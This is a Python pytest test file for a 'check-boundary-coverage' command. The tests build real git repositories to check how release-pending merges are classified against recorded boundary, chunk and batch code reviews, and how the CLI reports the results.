"""``check-boundary-coverage``: which release-pending merges a boundary review covered.

Each classification is driven on a real git repository with real evidence facts,
because the classification is a question about git history and the store, and a
mocked history would only confirm the classifier's own reading. The tests that
matter most for wave 2, which turns this answer into a gate, pin the strict
direction: work a boundary review never read must never read ``pr-covered``.
"""

from __future__ import annotations

import itertools
import json
import subprocess
import sys
from pathlib import Path

import pytest

from conftest import scrubbed_env  # noqa: E402

from lib import boundary_coverage as bc  # noqa: E402
from lib import evidence  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "plugin" / "bin" / "prawduct-hook"
_ids = itertools.count(1)

CUMULATIVE = "cumulative (bundle review, ready for PR)"
VERIFY = "verify-resolutions (delta review, prior findings only)"
CHUNK = "chunk (lighter pass, not ready for push)"


def _git(repo: Path, *args: str) -> str:
    proc = subprocess.run(["git", *args], cwd=str(repo), capture_output=True, text=True, timeout=15)
    assert proc.returncode == 0, f"git {args} failed: {proc.stderr}"
    return proc.stdout.strip()


def _write(repo: Path, rel: str, content: str) -> None:
    path = repo / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _commit(repo: Path, files: dict, msg: str) -> str:
    for rel, content in files.items():
        _write(repo, rel, content)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", msg)
    return _git(repo, "rev-parse", "HEAD")


def _tree(repo: Path, rev: str = "HEAD") -> str:
    return _git(repo, "rev-parse", f"{rev}^{{tree}}")


def _fragment(scope: str) -> dict:
    return {
        f".prawduct/changes/{scope}.md": (
            "---\nschema: 1\ntype: fix\n"
            f"scope: {scope}\ndate: 2026-11-23\ntitle: {scope}\ncloses: []\n---\n"
            f"What {scope} changed.\n\n## Consumer note\nnone: a fixture\n"
        )
    }


def _review(repo: Path, base_tree: str, head_tree: str, mode: str, *, blocking: bool = False) -> str:
    fact_id = f"rev-bc-{next(_ids):04d}"
    findings = [{"fid": "R-1", "severity": "BLOCKING", "title": "boom"}] if blocking else []
    body = {
        "base_tree": base_tree,
        "head_tree": head_tree,
        "files_changed": evidence.tree_diff(repo, base_tree, head_tree),
        "files_reviewed": evidence.tree_diff(repo, base_tree, head_tree),
        "findings": findings,
        "mode": mode,
    }
    assert evidence.append_fact(repo, "review", fact_id, body)["status"] == "appended"
    return fact_id


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q", "-b", "main")
    _commit(repo, {"src/app.py": "x = 0\n"}, "base")
    return repo


def _branch(repo: Path, name: str) -> str:
    """Cut ``name`` from main; return the merge-base tree."""
    _git(repo, "checkout", "-q", "-b", name, "main")
    return _tree(repo)


def _merge(repo: Path, name: str) -> str:
    _git(repo, "checkout", "-q", "main")
    _git(repo, "merge", "-q", "--no-ff", "-m", f"merge {name}", name)
    return _git(repo, "rev-parse", "HEAD")


def _classify(repo: Path, commit: str) -> bc.Entry:
    return bc.classify_merge(repo, commit)


def _run_cli(repo: Path, tmp_path: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(HOOK), "check-boundary-coverage", *args],
        cwd=str(repo), capture_output=True, text=True, timeout=60,
        env=scrubbed_env(tmp_path / "home", CLAUDE_PROJECT_DIR=str(repo)),
    )


class TestAPrsOwnBoundaryReview:
    def test_a_cumulative_then_fix_verification_is_pr_covered(self, repo):
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        reviewed = _tree(repo)
        _review(repo, base, reviewed, CUMULATIVE)
        _commit(repo, {"src/a.py": "a = 2\n"}, "fix")
        _review(repo, reviewed, _tree(repo), VERIFY)
        assert _classify(repo, _merge(repo, "f")).classification == bc.PR_COVERED

    def test_chunk_reviews_alone_are_inner_only(self, repo):
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CHUNK)
        entry = _classify(repo, _merge(repo, "f"))
        assert entry.classification == bc.INNER_ONLY, entry

    def test_new_work_reviewed_by_a_chunk_review_after_the_boundary_is_not_pr_covered(self, repo):
        """Only fix verification may follow the boundary review: a chunk review of
        new work after it means no boundary review read that work."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        reviewed = _tree(repo)
        _review(repo, base, reviewed, CUMULATIVE)
        _commit(repo, {"src/b.py": "b = 1\n"}, "more work")
        _review(repo, reviewed, _tree(repo), CHUNK)
        assert _classify(repo, _merge(repo, "f")).classification == bc.INNER_ONLY

    def test_a_boundary_review_starting_after_a_chunk_review_is_not_pr_covered(self, repo):
        """The boundary review must read the span from its base: one that starts at
        a chunk review's tree leaves the first chunk read only at the inner stage."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "chunk 1")
        first = _tree(repo)
        _review(repo, base, first, CHUNK)
        _commit(repo, {"src/b.py": "b = 1\n"}, "chunk 2")
        _review(repo, first, _tree(repo), CUMULATIVE)
        assert _classify(repo, _merge(repo, "f")).classification == bc.INNER_ONLY

    def test_an_open_blocker_is_never_pr_covered(self, repo):
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE, blocking=True)
        entry = _classify(repo, _merge(repo, "f"))
        assert entry.classification == bc.UNCOVERED and "blocking" in entry.reason, entry

    def test_an_inner_review_blocker_at_the_tip_blocks_pr_covered_too(self, repo):
        """A clean cumulative, then a chunk review of the same tree with an open
        blocker: the PR gate blocks on it, so the boundary reading must too, even
        though the blocker sits on a fact the boundary-only composition skips."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _review(repo, base, _tree(repo), CHUNK, blocking=True)
        assert _classify(repo, _merge(repo, "f")).classification == bc.UNCOVERED

    def test_no_review_is_uncovered(self, repo):
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        entry = _classify(repo, _merge(repo, "f"))
        assert entry.classification == bc.UNCOVERED and "no review" in entry.reason, entry


    def test_a_deferral_that_could_not_be_evaluated_says_so(self, repo, monkeypatch):
        """W8 m2: a crash in the PR gate's deferral predicate must not read as
        "nothing reviewed this" alone, which sends the operator to `evidence
        sync`. The reason names the failure; without one it does not."""
        from lib import gates  # noqa: PLC0415

        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        merge = _merge(repo, "f")
        assert "fix-tail deferral" not in _classify(repo, merge).reason  # the control

        def boom(*_a, **_k):
            raise RuntimeError("deferral boom")

        monkeypatch.setattr(gates, "_fix_tail_deferral", boom)
        entry = _classify(repo, merge)
        assert entry.classification == bc.UNCOVERED and "no review" in entry.reason, entry
        assert ("; the fix-tail deferral could not be evaluated (RuntimeError: deferral boom), so "
                "whether the PR gate deferred its fix tail is unknown") in entry.reason, entry


class TestABatchReviewOnTheBase:
    def test_a_boundary_review_bracketing_the_merge_covers_it(self, repo):
        """The base moves while the branch is open, so the batch review's span
        (base before → merge) is not the branch's own span and cannot read as a
        PR review of it."""
        before = _tree(repo, "main")
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        merge = _merge(repo, "f")
        assert _tree(repo, merge) != _tree(repo, "f"), "the fixture must not collapse to the PR span"
        batch = _review(repo, before, _tree(repo, merge), CUMULATIVE)
        entry = _classify(repo, merge)
        assert entry.classification == bc.BATCH_COVERED and batch in entry.reason, entry

    def test_a_batch_review_ending_before_the_merge_does_not(self, repo):
        """Control: the same review shape, but its head is the base BEFORE the merge."""
        _commit(repo, {"src/z.py": "z = 1\n"}, "base work")
        start, end = _tree(repo, "main~1"), _tree(repo, "main")
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        merge = _merge(repo, "f")
        _review(repo, start, end, CUMULATIVE)
        assert _classify(repo, merge).classification == bc.UNCOVERED

    def test_a_blocked_batch_review_does_not(self, repo):
        before = _tree(repo, "main")
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        merge = _merge(repo, "f")
        _review(repo, before, _tree(repo, merge), CUMULATIVE, blocking=True)
        assert _classify(repo, merge).classification == bc.UNCOVERED


def _suite_ran(repo: Path, rev: str) -> None:
    """A green suite run recorded on the store against ``rev``'s tree, at
    ``rev``: the transfer's third condition, in the body
    `evidence.append_test_run` writes, under a fixed id so the test draws no
    randomness."""
    body = {"tree": _tree(repo, rev), "head": _git(repo, "rev-parse", rev), "passed": 3,
            "failed": 0, "skipped": 0, "duration_seconds": 1, "source": "run"}
    fact_id = f"test-run-bc-{next(_ids):04d}"
    assert evidence.append_fact(repo, "test-run", fact_id, body)["status"] == "appended"


def _local_record(repo: Path, *, tree: "str | None", void: bool = False) -> None:
    """This checkout's own `.test-evidence.json`, kept out of the fixture's commits.
    ``void`` writes what `test-evidence record` leaves while a run is in flight:
    no `evidence_tree`, `degraded`, `void`, and an `in_progress` stamp."""
    exclude = repo / ".git" / "info" / "exclude"
    exclude.parent.mkdir(parents=True, exist_ok=True)
    if ".prawduct/.test-evidence.json" not in (exclude.read_text() if exclude.exists() else ""):
        with exclude.open("a", encoding="utf-8") as fh:
            fh.write("\n.prawduct/.test-evidence.json\n")
    record = {"timestamp": "2026-11-25T12:00:00Z", "passed": 3, "failed": 0, "skipped": 0,
              "duration_seconds": 1, "command": "pytest", "verifier": "none",
              "tests_executed": [], "changes_referenced": [], "coverage_level": "referenced"}
    if void:
        record.update(timestamp="2099-01-01T00:00:00Z", void="record attempt did not complete",
                      void_counts_from=None, degraded="a record attempt is in flight",
                      in_progress={"pid": 1, "host": "elsewhere", "started_at": "2099-01-01T00:00:00Z",
                                   "command": "pytest"})
    else:
        record["evidence_tree"] = tree
    _write(repo, ".prawduct/.test-evidence.json", json.dumps(record))


class TestABranchThatSyncedItsBaseAfterReview:
    """#1250: the PR gate passes a branch that synced its base after review by its
    base-advance transfer, so the release op must give the same answer, named, and
    never a wider one. The repro: review a branch, merge its base into it, commit
    only `.prawduct/` records, merge, classify."""

    def _synced(self, repo: Path, mode: str = CUMULATIVE, *, suite: "str | None" = "tip",
                after_sync: "dict | None" = None, before_merge=None) -> str:
        """``suite`` says where the branch's one green run was recorded: on its
        ``tip``, ``before-records`` (on the sync commit, before the records-only
        commit), or nowhere (None). ``before_merge`` runs at the branch tip."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        reviewed = _tree(repo)
        _review(repo, base, reviewed, mode)
        _commit(repo, {"src/a.py": "a = 2\n"}, "fix")
        _review(repo, reviewed, _tree(repo), VERIFY)
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        _git(repo, "checkout", "-q", "f")
        _git(repo, "merge", "-q", "--no-ff", "-m", "sync main", "main")
        if suite == "before-records":
            _suite_ran(repo, "f")
        _commit(repo, after_sync or {".prawduct/artifacts/build-plan-f.md": "records\n"}, "records")
        if suite == "tip":
            _suite_ran(repo, "f")
        if before_merge is not None:
            before_merge()
        merge = _merge(repo, "f")
        # The release reads the merge later, from a base that has moved on: the
        # suite question is about the branch tip, never the tree checked out now.
        _commit(repo, {"src/later.py": "later = 1\n"}, "later work on the base")
        return merge

    def test_a_reviewed_branch_that_synced_its_base_is_pr_transferred(self, repo):
        merge = self._synced(repo)
        entry = _classify(repo, merge)
        assert entry.classification == bc.PR_TRANSFERRED, entry
        assert "transferred across base advance" in entry.reason, entry
        assert bc.PR_TRANSFERRED in bc.COVERED

    def test_the_pr_gate_and_the_op_give_one_answer(self, repo):
        """The same span, asked of both instruments at the branch tip before merge
        and of the op after it."""
        from lib import gates  # noqa: PLC0415

        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        _git(repo, "checkout", "-q", "f")
        _git(repo, "merge", "-q", "--no-ff", "-m", "sync main", "main")
        _commit(repo, {".prawduct/artifacts/build-plan-f.md": "records\n"}, "records")
        _suite_ran(repo, "f")
        assert gates.branch_coverage_verdict(repo)["status"] == "transferred"
        assert _classify(repo, _merge(repo, "f")).classification == bc.PR_TRANSFERRED

    def test_with_no_suite_run_on_the_tip_it_is_uncovered_and_says_why(self, repo):
        entry = _classify(repo, self._synced(repo, suite=None))
        assert entry.classification == bc.UNCOVERED, entry
        assert "no suite run met the branch tip" in entry.reason, entry
        assert "may exist in another clone" in entry.reason, entry

    def test_a_deferral_that_could_not_be_evaluated_says_so_beside_the_suite_reason(
            self, repo, monkeypatch):
        """W8 m2, the transfer's arm: the uncovered reason keeps the suite
        sentence and adds that the deferral never got a look."""
        from lib import gates  # noqa: PLC0415

        merge = self._synced(repo, suite=None)

        def boom(*_a, **_k):
            raise RuntimeError("deferral boom")

        monkeypatch.setattr(gates, "_fix_tail_deferral", boom)
        entry = _classify(repo, merge)
        assert entry.classification == bc.UNCOVERED, entry
        assert "no suite run met the branch tip" in entry.reason, entry
        assert ("the fix-tail deferral could not be evaluated (RuntimeError: deferral boom), so "
                "whether the PR gate deferred its fix tail is unknown") in entry.reason, entry

    def test_a_grant_the_pr_gate_recorded_decides_with_no_suite_recheck(self, repo):
        """The PR gate granted against this checkout's own record, which never
        reaches the store; at the release that record is void (a run in flight)
        and no store run matches the tip. The recorded grant still answers."""
        from lib import gates  # noqa: PLC0415

        def pr_gate_grants():
            _local_record(repo, tree=_tree(repo))
            answer = gates.branch_coverage_verdict(repo, record_grants=True)
            assert answer["status"] == "transferred", answer

        merge = self._synced(repo, suite=None, before_merge=pr_gate_grants)
        _local_record(repo, tree=None, void=True)
        entry = _classify(repo, merge)
        assert entry.classification == bc.PR_TRANSFERRED, entry
        assert "check-cumulative-critic recorded its base-advance transfer grant" in entry.reason, entry

    def test_a_stop_gate_grant_for_the_same_span_is_the_pr_gates_too(self, repo):
        """At a clean tree the Stop gate and the PR gate grant the identical span,
        and the grant record is keyed on the span alone: the Stop gate, first at
        session end, writes the one fact and the PR gate's own grant is a
        duplicate of it. The release reads that fact."""
        from lib import gates  # noqa: PLC0415

        def stop_then_pr_gate_grant():
            _local_record(repo, tree=_tree(repo))
            # The session opened at the reviewed tip, before the sync (the shape
            # test_session_critic_gate's `_advanced_base_session` builds), so the
            # Stop gate asks the merge-base span, the PR gate's own.
            with (repo / ".git" / "info" / "exclude").open("a", encoding="utf-8") as fh:
                fh.write(".prawduct/.session-base-tree\n")
            _write(repo, ".prawduct/.session-base-tree", _tree(repo, "HEAD~1^1"))
            stop = gates.session_review_verdict(repo, record_grants=True)
            assert stop["status"] == "covered" and stop.get("transferred"), stop
            answer = gates.branch_coverage_verdict(repo, record_grants=True)
            assert answer["status"] == "transferred", answer
            grants = [f for f in evidence.read_facts(repo)["facts"] if f.get("kind") == "guard-refusal"]
            assert [g["body"]["gate"] for g in grants] == ["session-review-verdict"], grants

        merge = self._synced(repo, suite=None, before_merge=stop_then_pr_gate_grant)
        _local_record(repo, tree=None, void=True)
        entry = _classify(repo, merge)
        assert entry.classification == bc.PR_TRANSFERRED, entry
        assert "session-review-verdict recorded its base-advance transfer grant" in entry.reason, entry

    def test_a_run_before_a_records_only_commit_still_meets_the_tip(self, repo):
        """No grant is recorded, so the op re-decides; the branch's run predates
        its records-only commit, which cannot change a test outcome."""
        entry = _classify(repo, self._synced(repo, suite="before-records"))
        assert entry.classification == bc.PR_TRANSFERRED, entry
        assert "transferred across base advance" in entry.reason, entry

    def test_a_void_local_record_does_not_decide_a_merged_branch(self, repo):
        """The release checkout's own record is about the checkout, not the merged
        branch: a run in flight there must not deny every merge."""
        merge = self._synced(repo)
        _local_record(repo, tree=None, void=True)
        assert _classify(repo, merge).classification == bc.PR_TRANSFERRED

    def test_a_transfer_check_that_could_not_run_says_so(self, repo, monkeypatch):
        from lib import coverage  # noqa: PLC0415

        merge = self._synced(repo)
        monkeypatch.setattr(coverage, "diagnose_base_advance_transfer",
                            lambda *a, **k: {"status": "unavailable", "reason": "injected: tree pruned"})
        entry = _classify(repo, merge)
        assert entry.classification == bc.UNCOVERED, entry
        assert "transfer check could not run (injected: tree pruned)" in entry.reason, entry

    def test_a_transfer_of_chunk_coverage_is_inner_only(self, repo):
        """The transfer carries coverage; the boundary question still applies to the
        span it came from, so chunk-only work is not widened into pr-covered."""
        entry = _classify(repo, self._synced(repo, CHUNK))
        assert entry.classification == bc.INNER_ONLY, entry
        assert "transferred across base advance" in entry.reason, entry

    def test_judgeable_work_after_the_sync_is_uncovered(self, repo):
        """The records commit is a free edge; a code commit in its place is work no
        review read, and the branch diff is no longer the reviewed one."""
        entry = _classify(repo, self._synced(repo, after_sync={"src/a.py": "a = 3\n"}))
        assert entry.classification == bc.UNCOVERED, entry
        assert "no review evidence composes" in entry.reason, entry

    def test_the_count_line_counts_it_covered_and_names_it(self, repo):
        self._synced(repo)
        report = bc.classify_pending(repo)
        assert [e.classification for e in report.entries] == [bc.PR_TRANSFERRED]
        line = bc.count_line(report)
        assert "1 of 1 release-pending scope(s) covered" in line and "(1 pr-transferred)" in line, line
        assert not bc.render(report).splitlines()[0].endswith("[not covered]")


class TestTheCommitsShape:
    def test_a_branch_changing_no_judgeable_file(self, repo):
        _branch(repo, "f")
        _commit(repo, {"README.md": "hello\n", **_fragment("f")}, "docs")
        assert _classify(repo, _merge(repo, "f")).classification == bc.NO_JUDGEABLE

    def test_a_direct_commit_with_code(self, repo):
        commit = _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "direct")
        assert _classify(repo, commit).classification == bc.DIRECT

    def test_a_direct_commit_of_bookkeeping_only(self, repo):
        commit = _commit(repo, _fragment("f"), "release bookkeeping")
        assert _classify(repo, commit).classification == bc.NO_JUDGEABLE

    def test_a_squash_merge_reads_direct_and_says_so(self, repo):
        """The base moved while the branch was open, so the squash commit's trees
        are not the reviewed ones and nothing on the base brackets it."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        _git(repo, "merge", "-q", "--squash", "f")
        _git(repo, "commit", "-q", "-m", "squash f")
        entry = _classify(repo, _git(repo, "rev-parse", "HEAD"))
        assert entry.classification == bc.DIRECT and "squash" in entry.reason, entry

    def test_a_squash_merge_onto_the_reviewed_base_is_batch_covered(self, repo):
        """Renegotiated with #1232 Chunk 03, which asks the batch rule of work
        committed on the base too (a release batch review rates direct commits).
        A squash onto an unmoved base lands exactly the reviewed trees: the PR's
        boundary review brackets the commit on the first-parent line and rated
        every file, so it reads batch-covered rather than direct. The control
        above (the base moved) stays direct."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        review = _review(repo, base, _tree(repo), CUMULATIVE)
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--squash", "f")
        _git(repo, "commit", "-q", "-m", "squash f")
        entry = _classify(repo, _git(repo, "rev-parse", "HEAD"))
        assert entry.classification == bc.BATCH_COVERED and review in entry.reason, entry


class TestTheReport:
    def test_pending_scopes_join_to_the_commit_that_added_them(self, repo):
        base = _branch(repo, "covered")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("covered")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _merge(repo, "covered")
        _branch(repo, "bare")
        _commit(repo, {"src/b.py": "b = 1\n", **_fragment("bare")}, "work")
        _merge(repo, "bare")
        _write(repo, ".prawduct/changes/local.md", _fragment("local")[".prawduct/changes/local.md"])
        report = bc.classify_pending(repo)
        assert report.status == "ok", report
        got = {e.scope: e.classification for e in report.entries}
        assert got == {"covered": bc.PR_COVERED, "bare": bc.UNCOVERED, "local": bc.UNKNOWN}
        assert "1 of 3 release-pending scope(s) covered" in bc.render(report)

    def test_a_scope_added_again_after_a_release_reads_its_latest_merge(self, repo):
        """A release deletes a shipped fragment; the same scope name, added again,
        is pending through its NEWEST add. The old merge here was covered, the new
        one is not, and the reading must be the new one's."""
        base = _branch(repo, "first")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("again")}, "first time")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _merge(repo, "first")
        _git(repo, "rm", "-q", ".prawduct/changes/again.md")
        _git(repo, "commit", "-q", "-m", "release: cut again")
        _branch(repo, "second")
        _commit(repo, {"src/b.py": "b = 1\n", **_fragment("again")}, "second time")
        second = _merge(repo, "second")
        (entry,) = bc.classify_pending(repo).entries
        assert (entry.commit, entry.classification) == (second, bc.UNCOVERED), entry

    def test_a_refused_fragment_is_named_not_silently_dropped(self, repo):
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f"),
                       ".prawduct/changes/broken.md": "---\nschema: 1\n---\n"}, "work")
        _merge(repo, "f")
        report = bc.classify_pending(repo)
        assert [e.scope for e in report.entries] == ["f"]
        assert report.refusals and all("broken.md" in r for r in report.refusals), report.refusals
        assert "not classified: " in bc.render(report)
        assert "broken.md" in bc.render(report)

    def test_facts_from_a_newer_plugin_withhold_the_answer(self, repo, monkeypatch):
        """One of them could be a review with an open blocker, so classifying
        without them could read covered: the report is unevaluable instead."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _merge(repo, "f")
        real = evidence.read_facts

        def ahead(project_dir):
            read = real(project_dir)
            return {**read, "schema_ahead": [{"line": 9, "schema": 99, "kind": "review", "id": "rev-new"}]}

        monkeypatch.setattr(bc.evidence, "read_facts", ahead)
        report = bc.classify_pending(repo)
        assert report.status == "unevaluable" and "newer plugin" in report.reason, report
        single = bc.classify_merge(repo, _git(repo, "rev-parse", "main"))
        assert single.classification == bc.UNKNOWN and "newer plugin" in single.reason, single
        monkeypatch.setattr(bc.evidence, "read_facts", real)
        assert bc.classify_pending(repo).status == "ok"  # control

    def test_the_cli_exits_3_on_an_unreadable_change_record(self, repo, tmp_path):
        (repo / ".prawduct").mkdir(exist_ok=True)
        (repo / ".prawduct" / "change-log.md").mkdir()  # a directory cannot be read as text
        proc = _run_cli(repo, tmp_path)
        assert proc.returncode == 3, (proc.stdout, proc.stderr)
        assert "could not evaluate" in proc.stderr

    def test_every_classification_reaches_the_cli(self, repo, tmp_path):
        """The op as it is used: one repository holding a scope of each kind, read
        through `check-boundary-coverage --json`."""
        base = _branch(repo, "pr")
        _commit(repo, {"src/pr.py": "p = 1\n", **_fragment("pr")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _merge(repo, "pr")
        base = _branch(repo, "inner")
        _commit(repo, {"src/inner.py": "i = 1\n", **_fragment("inner")}, "work")
        _review(repo, base, _tree(repo), CHUNK)
        _merge(repo, "inner")
        _branch(repo, "bare")
        _commit(repo, {"src/bare.py": "b = 1\n", **_fragment("bare")}, "work")
        _merge(repo, "bare")
        _branch(repo, "docs")
        _commit(repo, {"README.md": "docs\n", **_fragment("docs")}, "docs")
        _merge(repo, "docs")
        before = _tree(repo, "main")
        _branch(repo, "batch")
        _commit(repo, {"src/batch.py": "x = 1\n", **_fragment("batch")}, "work")
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/moved.py": "m = 1\n"}, "base moves")
        batch_merge = _merge(repo, "batch")
        _review(repo, before, _tree(repo, batch_merge), CUMULATIVE)
        _commit(repo, {"src/direct.py": "d = 1\n", **_fragment("direct")}, "direct")
        _write(repo, ".prawduct/changes/local.md", _fragment("local")[".prawduct/changes/local.md"])
        proc = _run_cli(repo, tmp_path, "--json")
        assert proc.returncode == 0, proc.stderr
        got = {e["scope"]: e["classification"] for e in json.loads(proc.stdout)["entries"]}
        assert got == {
            "pr": bc.PR_COVERED, "inner": bc.INNER_ONLY, "bare": bc.UNCOVERED,
            "docs": bc.NO_JUDGEABLE, "batch": bc.BATCH_COVERED, "direct": bc.DIRECT,
            "local": bc.UNKNOWN,
        }
        human = _run_cli(repo, tmp_path)
        assert "3 of 7 release-pending scope(s) covered" in human.stdout, human.stdout

    def test_the_cli_answers_in_json_and_exits_0(self, repo, tmp_path):
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _merge(repo, "f")
        proc = subprocess.run(
            [sys.executable, str(HOOK), "check-boundary-coverage", "--json"],
            cwd=str(repo), capture_output=True, text=True, timeout=60,
            env=scrubbed_env(tmp_path / "home", CLAUDE_PROJECT_DIR=str(repo)),
        )
        assert proc.returncode == 0, proc.stderr
        data = json.loads(proc.stdout)
        assert data["status"] == "ok"
        assert [(e["scope"], e["classification"]) for e in data["entries"]] == [("f", bc.UNCOVERED)]
        assert data["counts"][bc.UNCOVERED] == 1

    def test_the_cli_exits_3_when_no_base_resolves(self, tmp_path):
        repo = tmp_path / "lonely"
        repo.mkdir()
        _git(repo, "init", "-q", "-b", "trunk-of-nothing")
        _commit(repo, {"src/a.py": "a = 1\n"}, "only")
        proc = subprocess.run(
            [sys.executable, str(HOOK), "check-boundary-coverage"],
            cwd=str(repo), capture_output=True, text=True, timeout=60,
            env=scrubbed_env(tmp_path / "home", CLAUDE_PROJECT_DIR=str(repo)),
        )
        assert proc.returncode == 3, (proc.stdout, proc.stderr)
        assert "could not evaluate" in proc.stderr

    def test_the_cli_refuses_an_unknown_argument(self, repo, tmp_path):
        proc = subprocess.run(
            [sys.executable, str(HOOK), "check-boundary-coverage", "--jsn"],
            cwd=str(repo), capture_output=True, text=True, timeout=60,
            env=scrubbed_env(tmp_path / "home", CLAUDE_PROJECT_DIR=str(repo)),
        )
        assert proc.returncode == 2 and "unknown argument" in proc.stderr


#: #1231's two reviews: a cumulative, then one verify-resolutions pass over its fixes.
_PR_1231_MERGE = "09a262e0ed69fc486c15573632f694793d97b296"
_PR_1231_REVIEWS = ("rev-20261124T031246Z-e5f07ea3", "rev-20261124T032413Z-a3ec33e4")
#: #1249: a boundary review and a verify pass, then a develop sync and a records
#: commit; the suite run that met its tip, and the grant the PR gate recorded.
_PR_1249_MERGE = "199ccf1071f3adc2187b22a2d1f33387c08bfa9c"
_PR_1249_REVIEWS = ("rev-20261125T230216Z-7af05777", "rev-20261125T231645Z-d07f7323")
_PR_1249_RUN = "test-run-20261125T232222Z-80d8b97e"
_PR_1249_GRANT = "guard-base-advance-transfer-045a45140cc3e077"


@pytest.mark.requires_history
@pytest.mark.timeout(240)
class TestThisRepositorysHistory:
    """Real merges whose review history is known: the classifier's reading of the
    real store, not of a fixture written from the same belief.

    The timeout is raised because composing over the real store keys every tree it
    names once (``gates._tree_key_fn``), which on a cold clone takes tens of seconds,
    the same cost the PR gate pays on its first run there. A warm run is under a second."""

    def test_the_v3_9_0_reopen_commit_on_develop_is_release_bookkeeping(self):
        """Git alone answers this one, whatever the store holds. It read `direct`
        until decision 3 of #1232 (owner-rulings 2026-11-25): its judgeable changes
        are the three files `release_version_files:` declares at the release
        anchor it follows (`57a1b47d release: prep v3.9.0`, its parent), so it is
        release bookkeeping, asked of the base as it stood before the v3.10.0 cut
        (`199ccf10`). The same commit asked of a base past that cut (`4dffd694`)
        precedes the anchor, so it is direct: bookkeeping reads against the
        release it follows, and only a commit since the current anchor can be it.
        There, the v3.10.0 reopen (`c9b58e4e`) is the bookkeeping, and `4dffd694`
        itself, which adds two `.py` measurement scripts beside its records,
        stays direct."""
        before_cut = "199ccf1071f3adc2187b22a2d1f33387c08bfa9c"
        after_cut = "4dffd694152233daab3d2e960481e3e5327da102"
        entry = bc.classify_merge(ROOT, "95308783", base=before_cut)
        assert entry.classification == bc.RELEASE_BOOKKEEPING, entry
        assert bc.classify_merge(ROOT, "95308783", base=after_cut).classification == bc.DIRECT
        assert bc.classify_merge(ROOT, "c9b58e4e", base=after_cut).classification == bc.RELEASE_BOOKKEEPING
        assert bc.classify_merge(ROOT, "4dffd694", base=after_cut).classification == bc.DIRECT

    @pytest.mark.requires_local_cache
    def test_the_v3_10_0_cut_is_the_release_anchor(self):
        """Decision 2's worked case: `436f44d3 release: prep v3.10.0` adds the
        release file, and the walk from a fixed point after it (the base as it
        stood on 2026-11-25, so a later release cannot move the answer) reaches the
        reopen commit as release bookkeeping. `v3.10.0` is tagged on main, never
        reachable from develop: promotions here are single-parent commits, so its
        merge-base with develop is v2.0.1's commit, far older on the line."""
        anchor = bc.release_anchor(ROOT, "4dffd694152233daab3d2e960481e3e5327da102")
        assert anchor is not None and anchor.commit.startswith("436f44d3"), anchor
        assert anchor.source == bc.ANCHOR_RELEASE_FILE and "v3.10.0.md" in anchor.reason, anchor

    @pytest.mark.requires_local_cache
    def test_a_per_pr_merge_with_a_cumulative_and_a_verify_is_pr_covered(self):
        """The store is this clone's, never committed: a fresh clone or CI has none
        of #1231's reviews. Whether they are present is read from the store FILE,
        not through the classifier, so a classifier that cannot see them fails
        here instead of skipping."""
        path = evidence.store_path(ROOT)
        text = path.read_text(encoding="utf-8") if path is not None and path.is_file() else ""
        missing = [rid for rid in _PR_1231_REVIEWS if rid not in text]
        if missing:
            pytest.skip(f"this clone's evidence store lacks #1231's reviews {missing}")
